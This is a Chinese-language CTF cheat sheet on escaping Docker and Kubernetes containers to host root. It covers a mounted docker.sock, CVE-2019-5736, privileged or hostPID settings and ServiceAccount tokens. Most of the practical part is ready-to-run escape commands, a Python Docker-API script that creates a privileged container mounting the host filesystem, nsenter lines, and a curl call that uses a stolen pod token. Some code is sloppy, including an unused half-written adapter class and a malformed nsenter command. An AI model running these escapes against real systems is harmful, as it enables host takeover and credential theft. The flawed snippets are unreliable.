---
title: Docker / K8s 场景下的 Web 逃逸（docker.sock 挂载、runc 漏洞）
category: web
tags: [docker, kubernetes, 容器逃逸, docker-sock, runc]
signals: [拿到 webshell 后发现 /var/run/docker.sock 可读写, 目录里有 /.dockerenv 文件, 容器内 ls / 看到 docker 命令行工具, 提示「容器」「逃逸」「宿主机」, /proc/1/cgroup 里出现 docker 或 kubectl 字样, 环境变量里出现 KUBERNETES_SERVICE_HOST, 目标存在「上传 Dockerfile 构建镜像」功能, 有 docker-compose.yml 挂在 web 目录, 题面输出预期是宿主机 root 的家目录]
difficulty: hard
source: "HackTricks / Unit42 / CVE 官方"
tools: [python, docker, kubectl]
updated: 2026-10-22
---

## 一、识别信号（题面长什么样）

- webshell 后 `ls /` 看到 `.dockerenv`，`cat /proc/1/cgroup` 里有 `docker`。
- `/var/run/docker.sock` 存在且 `ls -l` 显示为 socket，当前用户可写。
- 环境变量 `KUBERNETES_SERVICE_HOST`、`KUBERNETES_PORT`、`/var/run/secrets/kubernetes.io/serviceaccount/token`。
- 题目部署说明里给了 `docker-compose.yml`、`Dockerfile`、`privileged: true`、`cap_add: SYS_ADMIN`。
- 题面提示：`容器`、`逃逸`、`宿主机`、`docker`、`k8s`、`runc`、`CVE-2019-5736`。
- 目标应用本身是"镜像构建服务"、"容器管理面板"、"在线 IDE"。
- 挂载可见：`/host`、`/mnt`、`/var/lib/docker` 在容器内出现。

## 二、原理

### 1. docker.sock 挂载 —— 最常见

```
docker run -v /var/run/docker.sock:/var/run/docker.sock ...
```

sock 是 Docker daemon 的**控制接口**，能直接用 curl 调 API：

```bash
curl --unix-socket /var/run/docker.sock http://localhost/version
```

一旦能建容器并挂载宿主机根目录：

```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host
```

→ 直接是宿主机 root。

### 2. CVE-2019-5736（runc 逃逸）

- 影响：Docker < 18.09.2、runc < 1.0-rc6。
- 原理：`docker exec` 时，runc 在容器内 `open("/proc/self/exe")` 拿自己的二进制；容器内 `/proc/self/exe` 指向的就是**宿主机上的 runc**。用 `O_PATH` + `linkat` 把 `/proc/self/exe` 替换成恶意 ELF，下次 runc 执行时以宿主 root 运行。
- 利用前提：能控制容器内的执行（有 shell）、能写 `/proc/self/exe`（需要 root 或 `CAP_SYS_PTRACE`）。
- 利用条件苛刻（要 `openat(AT_EMPTY_PATH)` 等），但 CTF 里可能直接给你一个 runc 可覆盖的 PoC。

### 3. 其他常见逃逸面

| 面 | 判据 | 利用 |
|---|---|---|
| `privileged: true` | `capsh --print` 显示全 capability | 挂载宿主机磁盘 / `mount` |
| `CAP_SYS_ADMIN` | 有 `mount` 权限 | `mount /dev/sdaX /mnt` |
| 挂载 `/var/lib/docker` | `ls /var/lib/docker` 有内容 | 直接读 container 的 overlay |
| `hostPID: true` | `ps aux` 看到宿主机进程 | `nsenter -t 1 -m -u -i -n -p sh` |
| `hostNetwork` | `ip a` 看到宿主机网卡 | 直接打内网 |
| cgroup v1 release_agent | `/sys/fs/cgroup` 可写 | CVE-2022-0492 |
| `docker-compose` 文件 | 卷映射里有 `/` | 读 compose 找挂载 |

### 4. K8s 特有

- ServiceAccount token：`/var/run/secrets/kubernetes.io/serviceaccount/token`，可调 `https://kubernetes.default.svc/api`。
- 权限过大：token 能 `pods/exec`、`secrets get` → 拿其它 Pod 的凭据。
- `hostPath` 挂载：查 Pod spec 里的卷。

## 三、解题步骤

1. **确认在容器里**：`cat /proc/1/cgroup`、`ls -la /.dockerenv`、`hostname`。
2. **列挂载**：`cat /proc/mounts`、`mount`，找 `/var/run/docker.sock`、`/host`、`/var/lib/docker`。
3. **查 capability**：`capsh --print`、`grep Cap /proc/self/status`。
4. **docker.sock 存在** → 起一个挂 `/` 的容器 `chroot /host`。
5. **hostPID** → `nsenter -t 1 -m -u -i -n -p -- root`。
6. **runc 版本 < 1.0-rc6** → 用 CVE-2019-5736 PoC。
7. **拿 root** → `cat /flag`、`cat /root/flag`。

## 四、可直接运行的脚本

docker.sock 逃逸（一步到位）：

```bash
# 0) 确认
ls -l /var/run/docker.sock
curl -s --unix-socket /var/run/docker.sock http://localhost/version

# 1) 起特权容器挂载宿主机根
docker -H unix:///var/run/docker.sock run --rm -it \
  -v /:/host --privileged --pid=host alpine sh

# 2) 容器内 chroot 到宿主机
chroot /host /bin/sh
cat /root/flag
```

纯 curl 版本（没有 docker 客户端时）：

```python
import json, socket, requests

SOCK = "/var/run/docker.sock"

class UnixAdapter(requests.adapters.HTTPAdapter):
    def __init__(self, sock):
        self.sock = sock
        super().__init__()
    def init_poolmanager(self, *a, **kw):
        kw["socket_options"] = None
        from urllib3 import PoolManager
        import urllib3
        class UnixPool(urllib3.connectionpool.HTTPConnectionPool):
            pass
        super().init_poolmanager(*a, **kw)

# 最简陋可用版：直接调 HTTP API
def api(method, path, body=None):
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.connect(SOCK)
    payload = json.dumps(body or {}).encode()
    req = ("%s %s HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/json\r\n"
           "Content-Length: %d\r\n\r\n" % (method, path, len(payload))).encode() + payload
    s.sendall(req)
    data = b""
    while True:
        chunk = s.recv(65535)
        if not chunk: break
        data += chunk
    s.close()
    return data

# 创建挂载宿主机 / 的容器并执行命令
host = {"Binds": ["/:/host"], "Privileged": True, "PidMode": "host"}
print(api("POST", "/containers/create", {
    "Image": "alpine", "Cmd": ["/bin/sh", "-c", "cat /host/root/flag > /host/tmp/out.txt"],
    "HostConfig": host}).decode()[:200])
```

CVE-2019-5736 要点（PoC 骨架，仅说明原理）：

```c
/* 关键：以 O_PATH 打开 /proc/self/exe，把自己换成恶意 payload */
int fd = open("/proc/self/exe", O_PATH);
/* 使用时把 /proc/self/exe 替换为恶意 ELF，等待宿主 runc 再次执行 */
```

K8s token 利用：

```bash
SA=/var/run/secrets/kubernetes.io/serviceaccount
curl -s --cacert $SA/ca.crt -H "Authorization: Bearer $(cat $SA/token)" \
  https://kubernetes.default.svc/api/v1/namespaces/default/pods
# 若返回列表 → 试 exec 进带 hostPath 的 pod
```

## 五、常见坑 / 变体

- **sock 存在但无权限**：`ls -l` 看 mode，`groups`、`id`；只能读不能写则无用。
- **`docker` 客户端不在容器里**：用 curl + `--unix-socket`，或自己 `curl` 的 `-F`。
- **镜像拉不到**：优先用宿主机已缓存的镜像（`/images/json` 看列表），`alpine`、`busybox` 最常见。
- **`--privileged` 被禁**：仍可 `-v /:/host` 起非特权容器（如果 daemon 允许）。
- **宿主机有 SELinux/AppArmor**：`-v /:/host` 可能被拒绝，加 `:z` 或试 `--security-opt`.
- **CVE-2019-5736 需要 root**：非 root 拿不到 `/proc/self/exe` 的写权限。
- **K8s 里不能起容器**：直接打 API（exec 进 hostPath pod）。
- **变体：`/var/run/docker.sock` 只读挂载 → 仍可 `POST /containers/create`**（sock 挂载不管只读）。
- **变体：`/etc/crontab` 直接挂载 → 写 cron 反连**。
- **变体：`hostPID` + `nsenter`**，不需要 docker.sock。

## 六、参考来源

- [Unit42 — Container Breakouts: Escape Techniques](https://unit42.paloaltonetworks.com/container-escape-techniques/)
- [HackTricks — Docker Registry / Container Escape](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/index.html)
- [CVE-2019-5736 官方记录](https://www.cve.org/CVERecord?id=CVE-2019-5736)
- [Docker Engine API Reference](https://docs.docker.com/reference/api/engine/)
- [Kubernetes — Service Account Tokens](https://kubernetes.io/docs/concepts/security/service-accounts/)
- [carlospolop/hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)
